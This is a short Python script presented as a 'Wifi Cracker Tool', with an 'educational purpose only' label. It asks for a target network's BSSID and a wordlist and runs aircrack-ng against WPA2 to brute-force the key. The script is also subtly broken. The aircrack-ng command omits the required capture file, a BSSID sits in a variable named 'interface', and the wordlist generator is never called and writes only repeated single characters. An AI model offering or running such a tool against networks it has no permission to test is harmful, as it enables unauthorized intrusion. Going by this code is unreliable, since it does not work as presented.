import subprocess
import os
import time
import threading

def generate_wordlist(filename, length):
    chars = 'abcdefghijklmnopqrstuvwxyz1234567890'
    with open(filename, 'w') as file:
        for i in range(1, length + 1):
            for j in chars:
                file.write(j * i + '\n')

def crack_wifi(interface, wordlist):
    print("[+] Starting Wifi Cracker")
    cmd = ["aircrack-ng", "-a2", "-b", interface, "-w", wordlist]
    try:
        subprocess.call(cmd)
    except KeyboardInterrupt:
        print("[!] Process interrupted by user")
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    interface = input("Enter target network BSSID: ")
    wordlist = input("Enter path to wordlist: ")
    if not os.path.exists(wordlist):
        print("[!] Wordlist file not found")
        return

    t = threading.Thread(target=crack_wifi, args=(interface, wordlist))
    t.start()
    t.join()

if __name__ == "__main__":
    print("Wifi Cracker Tool - Educational Purpose Only")
    main()